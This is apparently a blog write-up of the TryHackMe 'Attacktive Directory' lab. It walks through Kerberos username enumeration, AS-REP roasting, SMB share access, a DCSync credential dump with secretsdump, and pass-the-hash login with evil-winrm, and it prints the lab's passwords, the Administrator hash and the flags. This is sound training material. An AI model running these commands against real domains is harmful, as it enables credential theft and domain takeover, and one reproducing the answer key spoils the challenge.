---
title: Attacktive Directory
categories: [TryHackMe,Pentest Plus,Local host vulnerabilities]
tags: [tryhackme,paths,pentest plus,Local host vulnerabilities,notes,comptia, offensive, Kerberos]     # TAG names should always be lowercase
---

+ 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

## Previous Room 
+ <https://4ghora.pro/posts/Active-Directory-Basics/> 
  
## Setup
### Installing Impacket
+ python version >=3.7 maybe required
+  clone the Impacket Github repo onto your box.
``` bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```
+ install related files, requirements.txt, and setup.py
+ To install the Python requirements for Impacket:
``` bash
pip3 install -r /opt/impacket/requirements.txt
```
+ requirements have finished installing, we can then run the python setup install script
```bash
cd /opt/impacket/ && sudo python3 ./setup.py install
```
### Installing Bloodhound and Neo4j
+ Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory
``` bash
sudo apt install bloodhound neo4j
```
+ **Done**
  
### Troubleshooting
+ If you are having issues installing Bloodhound and Neo4j, try issuing the following command
```bash
sudo apt update && apt upgrade
```

## Welcome to Attacktive Directory
### Enumeration
+ **Nmap Scan Result**

```
# Nmap 7.80 scan initiated Wed Feb 15 19:00:57 2023 as: nmap -T4 -A -v -oA nmap-results/Attacktive-Directory 10.10.141.80
Nmap scan report for 10.10.141.80 (10.10.141.80)
Host is up (0.21s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-15 13:31:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-15T13:33:44+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-14T11:33:22
| Not valid after:  2023-08-16T11:33:22
| MD5:   b15e 6a11 0d22 189f 2dbd bbd4 143a 96db
|_SHA-1: 32cf f5ee deed c3d7 7589 7c6a 89f4 e482 a876 05a4
|_ssl-date: 2023-02-15T13:33:59+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/15%Time=63ECDEA1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/15%OT=53%CT=1%CU=38679%PV=Y%DS=2%DC=T%G=Y%TM=63ECDFC
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS
OS:%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-15T13:33:44
|_  start_date: N/A

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   207.42 ms 10.14.0.1 (10.14.0.1)
2   207.66 ms 10.10.141.80 (10.10.141.80)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 15 19:06:00 2023 -- 1 IP address (1 host up) scanned in 302.46 seconds
```
### Questions
1. What tool will allow us to enumerate port 139/445?
+ **enum4linux**
2. What is the NetBIOS-Domain Name of the machine?
- **THM-AD**
3. What invalid TLD do people commonly use for their Active Directory Domain? 
- **.local**

## Enumerating Users via Kerberos 
### Introduction
+ Kerberos is a key authentication service within Active Directory
+ It is NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

### Questions
1. What command within Kerbrute will allow us to enumerate valid usernames?
+ Userenum
2. What notable account is discovered? (These should jump out at you)
+ svc-admin
3. What is the other notable account is discovered? (These should jump out at you)
+ backup

## Abusing Kerberos
### Questions
1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+ svc-admin
2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+ Kerberos 5 AS-REP etype 23
3. What mode is the hash?
+ 18200
4. Now crack the hash with the modified password list provided, what is the user accounts password?
+ management2005

## Back To The Basics
+ With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

```bash 
smbclient -N -L //spookysec.local --user=svc-admin --password=management2005
```

![Desktop View](/../assets/img/TryHackMe/AD%207.png){: width="972" height="589" }
_Full screen width and center alignment_

```bash
smbclient //spookysec.local/backup --user=svc-admin --password=management2005
```

![Desktop View](/../assets/img/TryHackMe/AD%208.png){: width="972" height="589" }
_Full screen width and center alignment_

### Questions
1. What utility can we use to map remote SMB shares?
+ smbclient
2. Which option will list shares?
+ 6
3. How many remote shares is the server listing?
+ 6
4. There is one particular share that we have access to that contains a text file. Which share is it?
+ backup
5. What is the content of the file?
+ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw



6. Decoding the contents of the file, what is the full contents?
+ backup@spookysec.local:backup2517860

**Website Used For Decoding**
+ <https://www.base64decode.org/>

## Elevating Privileges within the Domain

### Let's Sync Up!
+ The username of the account "backup" gets us thinking. What is this the backup account to?
  + It is the backup account for the Domain Controller.
  + account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes
  + Now You Have password : backup2517860
  
+ use another tool within Impacket called **secretsdump.py**

```bash
impacket-secretsdump -just-dc backup@spookysec.local
```

![Desktop View](/../assets/img/TryHackMe/AD%209.png){: width="972" height="589" }
_Full screen width and center alignment_

### Questions
1. What method allowed us to dump NTDS.DIT?
+ DRSUAPI
2. What is the Administrators NTLM hash?
+ 0e0363213e37b94221497260b0bcb4fc
3. What method of attack could allow us to authenticate as the user without the password?
+ Pass The Hash
4. Using a tool called Evil-WinRM what option will allow us to use a hash?
+ -H

## Flag Submission Panel

```bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![Desktop View](/../assets/img/TryHackMe/AD%2010.png){: width="972" height="589" }
_Full screen width and center alignment_

![Desktop View](/../assets/img/TryHackMe/AD%2011.png){: width="972" height="589" }
_Full screen width and center alignment_

### Questions

1.  svc-admin
+ TryHackMe{K3rb3r0s_Pr3_4uth}
2. backup
+ TryHackMe{B4ckM3UpSc0tty!}
3. Administrator
+ TryHackMe{4ctiveD1rectoryM4st3r}